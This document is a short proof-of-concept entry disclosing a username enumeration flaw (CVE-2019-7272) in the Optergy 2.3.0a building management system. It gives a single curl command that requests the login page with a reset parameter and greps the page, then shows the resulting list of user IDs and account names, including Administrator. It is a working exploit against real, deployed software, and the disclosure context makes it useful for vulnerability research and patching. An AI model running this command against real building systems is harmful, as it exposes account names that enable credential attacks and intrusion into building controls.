# Title: Optergy 2.3.0a - Username Disclosure
# Author: LiquidWorm
# Date: 2019-11-05
# Vendor: https://optergy.com/
# Product web page: https://optergy.com/products/
# Affected version: <=2.3.0a
# Advisory: https://applied-risk.com/resources/ar-2019-008
# Paper: https://applied-risk.com/resources/i-own-your-building-management-system
# CVE: CVE-2019-7272

# PoC:

curl -s http://192.168.232.19/Login.html?showReset=true | grep 'option value='
<option value="80">djuro</option>
<option value="99">teppi</option>
<option value="67">view</option>
<option value="3">alerton</option>
<option value="59">stef</option>
<option value="41">humba</option>
<option value="25">drmio</option>
<option value="11">de3</option>
<option value="56">andri</option>
<option value="6">myko</option>
<option value="22">dzonka</option>
<option value="76">kosto</option>
<option value="8">beebee</option>
<option value="1">Administrator</option>